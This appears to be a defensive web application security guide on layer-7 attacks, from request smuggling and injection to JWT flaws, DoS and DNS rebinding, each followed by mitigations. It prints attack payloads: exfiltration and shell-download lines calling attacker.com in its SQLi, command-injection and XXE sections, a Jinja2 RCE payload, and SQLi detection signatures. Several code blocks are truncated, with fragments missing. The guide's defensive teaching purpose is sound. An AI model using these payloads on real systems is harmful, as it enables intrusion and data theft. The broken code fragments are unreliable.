## 1. Foundational Concepts

### 1.1 Why L7 Is the Primary Attack Surface

The OSI model's application layer (L7) is where business logic, user identity, and data semantics live. Unlike L3/L4 attacks (IP spoofing, SYN floods) which are largely solved by modern network infrastructure, L7 attacks exploit the complexity and semantic richness of application protocols. An attacker who reaches L7:

- Operates inside TLS encryption — invisible to lower-layer inspection
- Can leverage legitimate protocol semantics to abuse business logic
- Targets the hardest-to-patch surface: application code
- Exploits trust relationships (OAuth tokens, JWTs, API keys) that lower layers cannot understand

### 1.2 The Trust Stack

```
Physical Hardware
  └── Hypervisor / BIOS
        └── OS Kernel
              └── Container Runtime (runc, gVisor, Kata)
                    └── Process / Service
                          └── Library / Framework
                                └── Application Logic    <-- L7 starts here
                                      └── Protocol Handler (HTTP, gRPC, WebSocket)
                                            └── Auth / AuthZ layer
                                                  └── Data Access / Business Logic
```

Each layer transitively trusts the one below it. A compromise at any layer undermines the security guarantees of all layers above. L7 security must assume potential compromise at any sublayer and apply defense-in-depth.

### 1.3 HTTP Protocol Fundamentals for Security Engineers

HTTP is a stateless, text-based (HTTP/1.x) or binary-framed (HTTP/2, HTTP/3) request-response protocol. Security-relevant components:

**Request structure:**
```
METHOD URI HTTP/VERSION\r\n
Header-Name: Header-Value\r\n
...\r\n
\r\n
[Body]
```

**Security-critical headers (request):**
| Header | Security Relevance |
|---|---|
| `Host` | Virtual-host routing, SSRF, Host header injection |
| `Authorization` | Bearer tokens, Basic auth credentials |
| `Cookie` | Session tokens, CSRF tokens |
| `Content-Type` | Parser selection, polyglot attacks |
| `X-Forwarded-For` | IP spoofing when trusted naively |
| `Transfer-Encoding` | HTTP desync attacks |
| `Content-Length` | HTTP desync, DoS via large bodies |
| `Origin` | CORS enforcement |
| `Referer` | Information leakage, CSRF |
| `User-Agent` | Fingerprinting, bot detection evasion |

**Security-critical headers (response):**
| Header | Security Relevance |
|---|---|
| `Content-Security-Policy` | XSS mitigation |
| `Strict-Transport-Security` | HSTS, SSL stripping prevention |
| `X-Frame-Options` | Clickjacking prevention |
| `X-Content-Type-Options` | MIME sniffing prevention |
| `Cache-Control` | Sensitive data caching |
| `Set-Cookie` | Session security flags |
| `Access-Control-Allow-Origin` | CORS policy |
| `Referrer-Policy` | Information leakage control |

### 1.4 Threat Modeling Framework (STRIDE at L7)

| Threat | L7 Manifestation |
|---|---|
| **S**poofing | JWT forgery, session fixation, IP spoofing via X-Forwarded-For |
| **T**ampering | Parameter pollution, request smuggling, body manipulation |
| **R**epudiation | Missing audit logs, log injection, log deletion |
| **I**nformation Disclosure | Error verbosity, timing attacks, path traversal |
| **D**enial of Service | Slowloris, CC attacks, algorithmic complexity attacks |
| **E**levation of Privilege | IDOR, JWT algorithm confusion, CSRF |

## 3. HTTP/HTTPS Attack Surface

### 3.1 HTTP Request Smuggling

**Mechanism:**

HTTP/1.1 allows two ways to specify body length: `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE). When a front-end proxy and back-end server disagree on which header takes precedence, an attacker can "smuggle" a prefix of one HTTP request into the next request's processing context.

**Variant CL.TE:**
The front-end uses `Content-Length`; back-end uses `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: vulnerable-app.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

The front-end forwards 30 bytes (the entire body). The back-end processes the chunked body, sees `0\r\n\r\n` as the end of the first request, then processes `GET /admin HTTP/1.1\r\nX-Ignore: X` as the beginning of the *next* request — effectively prepending attacker-controlled content to a victim's subsequent request.

**Variant TE.CL:**
The front-end uses `Transfer-Encoding`; back-end uses `Content-Length`.

```http
POST / HTTP/1.1
Host: vulnerable-app.com
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1

0
```

The front-end sees a valid chunked body and forwards everything. The back-end reads 4 bytes (`12\r\n`), then the next request in the pipeline starts from `GPOST`.

**Variant TE.TE (obfuscated):**
Both servers support `Transfer-Encoding`, but one can be manipulated to ignore it via obfuscation:

```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked, dechunked
Transfer-Encoding:\x0bchunked
```

**Impact:**
- Bypass access controls (smuggle requests to admin endpoints)
- Cache poisoning
- Session hijacking (capture victim's request headers including cookies)
- XSS via response queue poisoning

**Mitigation:**
```nginx
# Nginx: disable HTTP/1.1 keepalive to back-ends, or reject ambiguous requests
proxy_http_version 1.1;
proxy_set_header Connection "";

# HAProxy: enforce single TE handling
option http-server-close
```

```
# Best practice: use HTTP/2 end-to-end (no CL/TE ambiguity in H2)
# Validate Content-Length == actual body length at ingress
# Reject requests with both Content-Length AND Transfer-Encoding
# Deploy a WAF with desync detection (e.g., Coraza + OWASP CRS)
```

**Detection:**
```
# Look for:
# - Requests with both Content-Length and Transfer-Encoding
# - Chunked encoding with inconsistent termination
# - 400/501 responses from back-end triggered by previous request
# Alert on anomalous request timing distributions
```

### 3.2 HTTP Response Splitting and Header Injection

**Mechanism:**

If user input is reflected in HTTP response headers without sanitization, an attacker can inject `\r\n` (CRLF) sequences to terminate one header and inject new headers or an entirely new response body.

```
# Vulnerable endpoint: redirect to user-supplied URL
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20session=evil

# Attacker-controlled response headers injected:
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: session=evil
```

**Impact:**
- Session fixation via injected `Set-Cookie`
- Cache poisoning (inject fake response body for other users)
- XSS via injected `Content-Type` or body

**Mitigation:**
```python
# Never reflect raw user input in response headers
# Use allowlist validation for redirect URLs
import re
ALLOWED_REDIRECT = re.compile(r'^https://app\.example\.com/[a-zA-Z0-9/_\-]+$')

def safe_redirect(url):
    if not ALLOWED_REDIRECT.match(url):
        raise ValueError("Invalid redirect URL")
    # Strip all CR/LF characters
    url = url.replace('\r', '').replace('\n', '')
    return redirect(url)
```

### 3.3 HTTP Host Header Attacks

**Mechanism:**

Many web applications use the `Host` header for generating URLs (password reset links, absolute URLs in responses), routing requests to virtual hosts, or cache key generation. If this header is trusted without validation:

```http
# Attacker modifies Host header in password reset request
POST /reset-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

The server generates: `Click here to reset: https://attacker.com/reset?token=ABC123`

The victim clicks the link; the token is sent to `attacker.com`.

**Other Host header attack vectors:**
- **Web cache poisoning:** Cache stores response for `Host: attacker.com` but serves it for `Host: victim.com`
- **SSRF via Host:** Internal routing decisions based on `Host` value
- **Password reset poisoning:** As above
- **Virtual host brute-forcing:** Enumerate internal virtual hosts

**Mitigation:**
```go
// Go: validate Host header against allowlist
var allowedHosts = map[string]bool{
    "app.example.com": true,
    "api.example.com": true,
}

func hostValidationMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        host := r.Host
        // Strip port if present
        if h, _, err := net.SplitHostPort(host); err == nil {
            host = h
        }
        if !allowedHosts[host] {
            http.Error(w, "Invalid host", http.StatusBadRequest)
            return
        }
        next.ServeHTTP(w, r)
    })
}
```

```nginx
# Nginx: reject requests with unexpected Host header
server {
    listen 443 ssl;
    server_name app.example.com;
    
    # Default server catches all other Host values
    if ($host !~* ^(app|api)\.example\.com$) {
        return 444; # Silently drop
    }
}
```

## 4. Injection Attacks

### 4.1 SQL Injection

**Mechanism:**

SQL injection occurs when untrusted user input is interpolated directly into SQL queries, allowing the attacker to modify the query's structure. Despite being well-known, SQLi remains in the OWASP Top 10 and continues to cause major breaches.

**Classic in-band SQLi:**
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$input' AND password = '$pass';

-- Attacker input: username = admin'--
SELECT * FROM users WHERE username = 'admin'--' AND password = '';
-- Comment terminates the query; password check bypassed
```

**Union-based data extraction:**
```sql
-- Attacker determines number of columns, then:
' UNION SELECT username, password, NULL FROM users--

-- Extracting from information_schema:
' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--
```

**Blind SQLi (boolean-based):**
```sql
-- Application returns different responses for true/false conditions
-- Attacker binary-searches through data one bit at a time:
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

**Blind SQLi (time-based):**
```sql
-- When no visible difference exists, use conditional delays:
'; IF (SELECT COUNT(*) FROM users WHERE username='admin') > 0 WAITFOR DELAY '0:0:5'--
-- (MSSQL variant; MySQL: SLEEP(5), PostgreSQL: pg_sleep(5))
```

**Second-order SQLi:**
```
1. Attacker stores: username = admin'--
2. Application safely stores this string in DB
3. Later: application retrieves username, interpolates into different query
4. Injection executes in a different, potentially privileged context
```

**Out-of-band SQLi:**
```sql
-- When in-band and blind fail; exfiltrate via DNS/HTTP:
-- MySQL:
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\file'))--

-- MSSQL:
'; EXEC xp_cmdshell('nslookup '+(SELECT password FROM users WHERE username=''admin'')+'.attacker.com')--
```

**NoSQL Injection (MongoDB):**
```json
// Vulnerable Node.js:
db.users.find({ username: req.body.username, password: req.body.password })

// Attacker sends:
{ "username": {"$gt": ""}, "password": {"$gt": ""} }
// $gt operator matches all non-empty strings; bypasses auth
```

**Mitigation — Defense-in-Depth:**

```go
// Go: Always use parameterized queries / prepared statements
stmt, err := db.Prepare("SELECT id, email FROM users WHERE username = ? AND password_hash = ?")
if err != nil {
    return err
}
defer stmt.Close()
row := stmt.QueryRow(username, passwordHash)

// NEVER:
query := fmt.Sprintf("SELECT * FROM users WHERE username = '%s'", username)
db.Query(query) // VULNERABLE
```

```python
# Python: use parameterized queries (psycopg2, SQLAlchemy)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s",
               (username, password_hash))

# SQLAlchemy ORM (implicit parameterization):
user = session.query(User).filter_by(username=username).first()
```

```yaml
# Database security hardening:
# 1. Principle of least privilege: application DB user has only SELECT/INSERT/UPDATE on needed tables
# 2. No EXECUTE on stored procedures unless required
# 3. No access to information_schema or system tables from app user
# 4. Enable query logging and anomaly detection
# 5. WAF rules for SQLi patterns (OWASP CRS SQLi rules)
# 6. Input validation as secondary defense (not primary)
# 7. Error handling: never expose DB errors to clients
```

**Detection signatures:**
```
# Common SQLi patterns to alert on:
- UNION.+SELECT
- OR\s+['"]?\d+['"]?\s*=\s*['"]?\d+['"]?
- SLEEP\s*\(
- BENCHMARK\s*\(
- WAITFOR\s+DELAY
- xp_cmdshell
- information_schema
- \bOR\b\s+\b1\b\s*=\s*\b1\b
- '--
- ;--
```

### 4.2 Command Injection

**Mechanism:**

OS command injection occurs when user-supplied data is passed to a shell or system call without proper sanitization. The attacker can execute arbitrary operating system commands with the privileges of the web server process.

```python
# Vulnerable Python
import subprocess
filename = request.args.get('file')
output = subprocess.check_output(f"cat /var/data/{filename}", shell=True)

# Attacker: file = ../etc/passwd
# Attacker: file = valid.txt; wget http://attacker.com/shell.sh -O /tmp/s; bash /tmp/s
```

**Blind command injection:**
```
# When output is not returned, use out-of-band techniques:
# Time-based: file=valid.txt; sleep 10
# DNS exfil: file=valid.txt; curl http://$(whoami).attacker.com/
# File write: file=valid.txt; echo 'backdoor' >> /var/www/html/.htaccess
```

**Mitigation:**
```go
// Go: NEVER use shell=True or shell interpolation with user input
// Use exec.Command with explicit argument lists — no shell invocation

import "os/exec"

func processFile(filename string) ([]byte, error) {
    // Validate filename strictly
    if !isValidFilename(filename) {
        return nil, fmt.Errorf("invalid filename")
    }
    
    // Use exec.Command — args are passed directly, no shell interpolation
    cmd := exec.Command("cat", "/var/data/"+filename)
    return cmd.Output()
}

func isValidFilename(name string) bool {
    // Allowlist: only alphanumeric, hyphen, underscore, dot
    matched, _ := regexp.MatchString(`^[a-zA-Z0-9_\-\.]+$`, name)
    return matched && !strings.Contains(name, "..")
}
```

### 4.3 LDAP Injection

**Mechanism:**

Applications that construct LDAP queries from user input are vulnerable to LDAP injection. Attackers can modify the LDAP filter to bypass authentication or extract directory information.

```
# Vulnerable authentication query:
(&(uid=<username>)(password=<password>))

# Attacker username: *)(uid=*))(|(uid=*
# Resulting query:
(&(uid=*)(uid=*))(|(uid=*)(password=anything))
# Always true; authentication bypassed
```

**Mitigation:**
```python
# Escape all special LDAP characters: \ * ( ) \0 /
LDAP_ESCAPE_MAP = {
    '\\': r'\5c', '*': r'\2a', '(': r'\28', ')': r'\29', '\0': r'\00',
    '/': r'\2f', '+': r'\2b', '<': r'\3c', '>': r'\3e', ';': r'\3b',
    '"': r'\22', '#': r'\23', '=': r'\3d',
}

def ldap_escape(value):
    return ''.join(LDAP_ESCAPE_MAP.get(c, c) for c in value)
```

### 4.4 XML/XPath Injection and XXE

**XXE (XML External Entity) Injection Mechanism:**

XML parsers support "external entities" — references to external resources resolved during parsing. When an application parses untrusted XML with external entity processing enabled, an attacker can:

```xml
<!-- Basic XXE: read local files -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- SSRF via XXE: probe internal services -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

<!-- Blind XXE via DNS (out-of-band exfil) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>

<!-- XXE to RCE via PHP expect:// or other wrappers -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
```

**Billion Laughs (Entity Expansion DoS):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... -->
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
<!-- Exponential expansion: 10^9 "lol" strings = ~3GB -->
```

**Mitigation:**
```python
# Python: disable external entity processing
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,      # Disable entity resolution
    no_network=True,             # No network access
    dtd_validation=False,        # Don't validate against DTD
    load_dtd=False,              # Don't load external DTDs
)
tree = etree.fromstring(xml_data, parser=parser)
```

```java
// Java: secure XML parser configuration
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```go
// Go: use encoding/xml which does not support DTD/external entities by default
// But be careful with third-party XML libraries
import "encoding/xml"
// encoding/xml is safe by default; does not process external entities
```

### 4.5 Template Injection (SSTI)

**Mechanism:**

Server-Side Template Injection occurs when user input is embedded directly into template strings and evaluated by the template engine. Different engines use different syntax, but the exploit goal is the same: achieve arbitrary code execution.

```python
# Vulnerable Flask/Jinja2
from flask import render_template_string, request
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    template = f"Hello {name}!"  # WRONG: format string before passing to engine
    return render_template_string(template)

# Attacker: name={{7*7}} → renders "Hello 49!" (confirms SSTI)
# Attacker: name={{config.items()}} → leaks configuration
# Attacker RCE payload (Jinja2):
# {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
```

**Detection of SSTI (polyglot probe):**
```
${{<%[%'"}}%\.    # Triggers errors in multiple template engines
{{7*'7'}}         # Jinja2: 7777777; Twig: 49
${7*7}            # FreeMarker/Groovy: 49
#{7*7}            # Ruby ERB: 49
```

**Mitigation:**
```python
# Jinja2: pass variables to template, never construct template from user input
from flask import render_template

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # name is passed as a context variable, NOT embedded in template string
    return render_template('greet.html', name=name)

# greet.html: <p>Hello {{ name | e }}!</p>
# The | e filter HTML-escapes the output
```

## 5. Authentication and Session Attacks

### 5.1 Session Hijacking

**Mechanisms:**
1. **Network interception** (pre-HTTPS): Sniff unencrypted cookies
2. **XSS-based theft**: `document.cookie` exfiltration
3. **Session fixation**: Force victim to use attacker-known session ID
4. **Session prediction**: Weak/predictable session token generation
5. **Cross-site request forgery**: Use victim's session from attacker's site

**Session Fixation Detail:**
```
1. Attacker visits /login → receives session ID: SID=abc123
2. Attacker sends victim: https://app.com/login?SID=abc123
3. Victim logs in with that session ID
4. Application fails to rotate session ID on login
5. Attacker now shares session with authenticated victim
```

**Mitigation:**
```go
// Go: regenerate session ID on every authentication state change
func loginHandler(w http.ResponseWriter, r *http.Request) {
    // Validate credentials...
    
    // Critical: create a NEW session after authentication
    // Never reuse the pre-authentication session ID
    oldSession := sessionStore.Get(r)
    oldSession.Destroy()                         // Invalidate old session
    
    newSession := sessionStore.New(w, r)         // Create fresh session
    newSession.Set("user_id", userID)
    newSession.Set("authenticated", true)
    newSession.Set("ip", r.RemoteAddr)           // Optional: IP binding
    newSession.Set("ua", r.Header.Get("User-Agent")) // Optional: UA binding
    newSession.Save()
}
```

```go
// Secure cookie configuration
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionToken,
    Path:     "/",
    Domain:   "app.example.com",
    MaxAge:   3600,             // 1 hour
    Secure:   true,             // HTTPS only
    HttpOnly: true,             // No JavaScript access
    SameSite: http.SameSiteStrictMode, // CSRF protection
})
```

### 5.2 JWT Attacks

**5.2.1 Algorithm Confusion (alg:none)**

```
# JWT structure: header.payload.signature
# Attacker modifies header: {"alg":"none","typ":"JWT"}
# And removes signature
# Vulnerable libraries accept this if they check alg from the token itself

# Exploit:
original_jwt = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMSJ9.SIGNATURE"
malicious_jwt = "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
# base64({"alg":"none"}).base64({"sub":"admin"}).""
```

**5.2.2 RS256 → HS256 Confusion Attack**

```
# When server uses RS256 (asymmetric), public key is often published
# Attacker changes alg to HS256 (symmetric), signs with the PUBLIC KEY
```

**5.2.5 JWT Claims Manipulation**

```

# - Missing expiration (exp) claim validation
# - Accepting expired tokens ("leeway" too large)

# - Not validating aud (audience) claim
# - Accepting tokens signed by any key in a JWKS
```

**Mitigation — Comprehensive JWT Security:**
```go
// Go: use a well-audited library with strict validation
// github.com/golang-jwt/jwt/v5

import (
    "github.com/golang-jwt/jwt/v5"
    "time"
)

var (
    allowedAlgorithms = []string{"RS256"}  // NEVER allow "none" or symmetric in prod
    publicKey         = loadPublicKey()     // Load from secure key store at startup
)

func validateJWT(tokenString string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(
        tokenString,
        &Claims{},
        func(token *jwt.Token) (interface{}, error) {
            // CRITICAL: validate algorithm before returning key
            if token.Method.Alg() != "RS256" {
                return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
            }
            return publicKey, nil
        },
        jwt.WithValidMethods(allowedAlgorithms),
        jwt.WithLeeway(30*time.Second),    // Max clock skew tolerance
        jwt.WithIssuedAt(),                // Validate iat claim
        jwt.WithExpirationRequired(),      // Require exp claim
    )
    
    if err != nil {
        return nil, fmt.Errorf("invalid token: %w", err)
    }
    
    claims, ok := token.Claims.(*Claims)
    if !ok || !token.Valid {
        return nil, fmt.Errorf("invalid claims")
    }
    
    // Additional validation
    if claims.Issuer != "https://auth.example.com" {
        return nil, fmt.Errorf("invalid issuer")
    }
    if !sliceContains(claims.Audience, "api.example.com") {
        return nil, fmt.Errorf("invalid audience")
    }
    
    return claims, nil
}
```

### 5.4 Credential Stuffing and Brute Force

```go
// Go: multi-signal rate limiting
type RateLimiter struct {
    byIP       *redis.Client  // Per-IP counters
    byAccount  *redis.Client  // Per-account counters
    global     *redis.Client  // Global counters
}

func (rl *RateLimiter) CheckLogin(ip, username string) error {
    ctx := context.Background()
    
    // Check per-IP limit (10 attempts/minute)
    ipKey := fmt.Sprintf("login:ip:%s", ip)
    if count, _ := rl.byIP.Incr(ctx, ipKey).Result(); count == 1 {
        rl.byIP.Expire(ctx, ipKey, time.Minute)
    } else if count > 10 {
        return ErrRateLimitIP
    }
    
    // Check per-account limit (5 attempts/5 minutes)
    accountKey := fmt.Sprintf("login:account:%s", username)
    if count, _ := rl.byAccount.Incr(ctx, accountKey).Result(); count == 1 {
        rl.byAccount.Expire(ctx, accountKey, 5*time.Minute)
    } else if count > 5 {
        return ErrRateLimitAccount
    }
    
    return nil
}
```

## 6. Application Logic Attacks

### 6.1 Insecure Direct Object Reference (IDOR)

**Mechanism:**

IDOR occurs when an application uses user-controllable input to access objects directly without adequate authorization checks. It's not a single vulnerability but a class of authorization failures.

```
# Horizontal privilege escalation:
GET /api/invoices/1234          # User's own invoice
GET /api/invoices/1235          # Another user's invoice — returns 200?

# Vertical privilege escalation:
GET /api/users/42/admin-settings?user_id=42    # Normal user
POST /api/users/42/grant-role?role=admin       # Can a normal user do this?

# Indirect IDOR (guessable IDs):
GET /api/documents?file=user_42_report.pdf
GET /api/documents?file=user_1_report.pdf    # Admin's report?
```

**Non-obvious IDOR patterns:**
```
# In request body:
{"order_id": 9999, "action": "cancel"}

# In JSON arrays:
{"items": [{"id": 1}, {"id": 9999}]}  # Can you access item 9999?

# In multipart form data:
Content-Disposition: form-data; name="document_id"
victim_doc_id

# In GraphQL queries:
query { user(id: "victim_id") { creditCard { number } } }

# Via mass assignment:
PUT /api/users/me
{"name": "New Name", "role": "admin"}  # role should not be settable by user
```

**Mitigation:**
```go

        return err

        return ErrForbidden
    }
    return nil
}
```

```go
// Go: use database-level locking for critical financial operations
func TransferFunds(ctx context.Context, db *sql.DB, fromID, toID string, amount decimal.Decimal) error {
    tx, err := db.BeginTx(ctx, &sql.TxOptions{
        Isolation: sql.LevelSerializable,  // Highest isolation level
    })
    if err != nil {
        return err
    }
    defer tx.Rollback()
    
    // SELECT FOR UPDATE: locks the row until transaction commits
    var balance decimal.Decimal
    err = tx.QueryRowContext(ctx,
        "SELECT balance FROM accounts WHERE id = $1 FOR UPDATE",
        fromID,
    ).Scan(&balance)
    if err != nil {
        return err
    }
    
    if balance.LessThan(amount) {
        return ErrInsufficientFunds
    }
    
    // Atomic update
    _, err = tx.ExecContext(ctx,
        "UPDATE accounts SET balance = balance - $1 WHERE id = $2",
        amount, fromID,
    )
    if err != nil {
        return err
    }
    
    _, err = tx.ExecContext(ctx,
        "UPDATE accounts SET balance = balance + $1 WHERE id = $2",
        amount, toID,
    )
    if err != nil {
        return err
    }
    
    return tx.Commit()
}
```

## 8. DoS and DDoS at Layer 7

### 8.1 Application-Layer DoS Taxonomy

**8.1.1 Slowloris**

Slowloris keeps many connections open to the target web server by sending partial HTTP requests, never completing them. Each connection is kept alive by periodically sending additional headers.

```python
# Conceptual Slowloris (educational illustration):
# 1. Open N sockets to target
# 2. Send partial HTTP header:
#    GET / HTTP/1.1\r\nHost: target.com\r\n
# 3. Every ~15 seconds, send another header to keep connection alive:
#    X-Keep-Alive: 1\r\n
# 4. Never send the final \r\n that terminates the request
# 5. Exhaust server's connection pool → legitimate users get no connections

# Note: This does NOT work against HTTP/2 or servers with good timeout config
```

**Mitigation:**
```nginx
# Nginx: defend against Slowloris
http {
    # Timeout for reading the full request header from client
    client_header_timeout 10s;
    
    # Timeout for reading the request body
    client_body_timeout 10s;
    
    # Timeout for sending response to client
    send_timeout 10s;
    
    # Keep-alive timeout
    keepalive_timeout 65s;
    keepalive_requests 100;
    
    # Limit simultaneous connections per IP
    limit_conn_zone $binary_remote_addr zone=per_ip:10m;
    limit_conn per_ip 20;
    
    # Large client header buffers for legitimate use but limited depth
    large_client_header_buffers 4 16k;
}
```

**8.1.2 HTTP Flood (CC Attack)**

High-volume legitimate-looking HTTP requests targeting computationally expensive endpoints:
- Search with complex queries
- Report generation
- Password hashing endpoints
- File upload processing

```
Attack: 10,000 bots × 100 req/s = 1M req/s to /api/search?q=complex_query
Each request triggers: DB query, Elasticsearch query, rendering → 500ms server time
```


**8.1.3 ReDoS (Regular Expression Denial of Service)**

Some regular expressions have exponential worst-case matching time. An attacker submits crafted input that causes catastrophic backtracking.

```
# Vulnerable regex: (a+)+ or (a|aa)+
# Matching against input: "aaaaaaaaaaaaaaaaaaaaX"
# The regex engine tries exponentially many ways to match
# At length 30: O(2^30) operations = ~1 billion → seconds of CPU time

# Example vulnerable patterns:
^(a+)+$               # Exponential backtracking
^([a-zA-Z]+)*$        # Same issue
^(.*a){x}$            # When x is large
\s*\S+(\s+\S+)*\s*    # Path to super-linear matching
```

**Detection and Mitigation:**
```bash
# Static analysis: detect vulnerable regexes
npm install -g vuln-regex-detector
vuln-regex-detector --check "^(a+)+$"

# Go: use RE2-based regex (linear time guaranteed by design)
# Go's regexp package uses RE2 — no catastrophic backtracking
import "regexp"
re := regexp.MustCompile(`^[a-zA-Z0-9]+$`)  // Safe in Go

# Python: avoid re module for untrusted input with complex patterns
# Use google/re2 bindings:
import re2
pattern = re2.compile(r'^(a+)+$')  # RE2: linear time, errors on unsupported features

# Set regex timeouts:
import signal
def timeout_handler(signum, frame):
    raise TimeoutError("Regex timeout")
signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(1)  # 1 second timeout
try:
    result = re.match(pattern, user_input)
finally:
    signal.alarm(0)
```

**8.1.5 Hash Collision DoS (Hashtable Poisoning)**

```

# all hash to bucket 0 → O(n²) map operations
```

### 10.1 WebSocket Attacks

**10.1.1 WebSocket Hijacking (CSWSH)**

Cross-Site WebSocket Hijacking is analogous to CSRF but for WebSocket connections. WebSocket upgrade requests include cookies but NOT the CSRF token by default.

```javascript

    ws.send(JSON.stringify({action: "transfer", amount: 10000, to: "attacker"}));

// Browser sends victim's cookies with WebSocket upgrade request
// Server establishes authenticated WebSocket connection
```

**Mitigation:**

```go
// AND use a token in the WebSocket handshake

    ReadBufferSize:  1024,
    WriteBufferSize: 1024,

        origin := r.Header.Get("Origin")
        // Strict Origin validation
        allowed := map[string]bool{
            "https://app.example.com": true,

        return allowed[origin]
    },
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
    // Also validate a token passed in query string or first message
    token := r.URL.Query().Get("token")
    if _, err := validateJWT(token); err != nil {
        http.Error(w, "Unauthorized", http.StatusUnauthorized)
        return
    }
    
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        return
    }
    defer conn.Close()
    
    // Set read limits to prevent DoS
    conn.SetReadLimit(64 * 1024)  // 64KB max message
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))
    conn.SetPongHandler(func(string) error {
        conn.SetReadDeadline(time.Now().Add(60 * time.Second))
        return nil
    })
}
```

### 10.2 HTTP/2 Attacks

**10.2.1 HTTP/2 Rapid Reset (CVE-2023-44487)**

The most severe HTTP/2 DoS in history (2023). Attackers exploit the stream reset mechanism:

```
2. Client immediately sends RST_STREAM frame (cancels the stream)
3. Server must process the request setup even after RST
4. Repeat millions of times per second from distributed sources
5. Server CPU exhausted processing stream setup/teardown

Record DDoS: 398 million requests/second (Google, 2023)
```


**10.2.2 HTTP/2 Header Compression (HPACK) Attacks**

```
CRIME (Compression Ratio Info-leak Made Easy):
- If HTTP response body is compressed AND contains secrets (CSRF token)
- Attacker injects chosen plaintext and observes ciphertext length
- When injected text matches secret, compression ratio increases → shorter ciphertext
- Recover secret byte by byte

Mitigation:
- Never compress responses containing secrets
- Disable HTTP/1.1 gzip for responses with sensitive data
- HTTP/2 HPACK compresses headers by default; avoid secrets in headers when possible
```

### 10.3 HTTP/3 (QUIC) Considerations

```
HTTP/3 runs over QUIC (UDP-based):

New attack surface:
1. QUIC amplification: Initial packets can trigger larger responses
   - Mitigation: Server requires address validation (Retry packets)
   
2. Connection migration abuse: QUIC allows connection to migrate to new IP
   - Attacker can redirect traffic to victim's IP (DoS amplification)
   - Mitigation: Validate new path before completing migration

3. 0-RTT data replay attacks:
   - QUIC's 0-RTT feature allows data in first packet (no RTT)
   - Replay attackers can replay 0-RTT data to server
   - Mitigation: Never process non-idempotent operations in 0-RTT
   - Only allow GET requests in 0-RTT; reject POST/PUT/DELETE

Security benefits of QUIC/HTTP3:
- TLS 1.3 mandatory (no downgrade to older TLS)
- Connection establishment is encrypted from the start
- No TCP SYN-based attacks (UDP)
- Reduced header overhead (less metadata leakage)
```

## 11. DNS Application-Layer Attacks

### 11.1 DNS Rebinding

**Mechanism:**

DNS rebinding bypasses the Same-Origin Policy by first resolving a domain to a legitimate IP, then re-resolving it to an internal IP. The attacker's JavaScript then communicates with internal services.

```
1. victim.attacker.com → 203.0.113.1 (TTL: 60s)
   User browses to victim.attacker.com; JS loaded
   
2. 60 seconds later, TTL expires
   victim.attacker.com → 192.168.1.1 (internal router, TTL: 60s)
   
3. JS continues to make requests to victim.attacker.com
   Browser's SOP allows same-origin requests
   Requests now go to 192.168.1.1
   
4. Router's admin interface is accessed without authentication
   Credentials extracted, router configuration modified
   
Real-world impact: Cloud metadata at 169.254.169.254, internal APIs,
Kubernetes API server, etcd, etc.
```

**Mitigation:**
```go
// Go: validate Host header in all internal services
// Reject requests with unexpected Host values

func internalServiceMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        host := r.Host
        if h, _, err := net.SplitHostPort(host); err == nil {
            host = h
        }
        
        // Only accept requests with expected hostnames
        // Reject IP addresses (DNS rebinding uses IPs after rebind)
        if net.ParseIP(host) != nil {
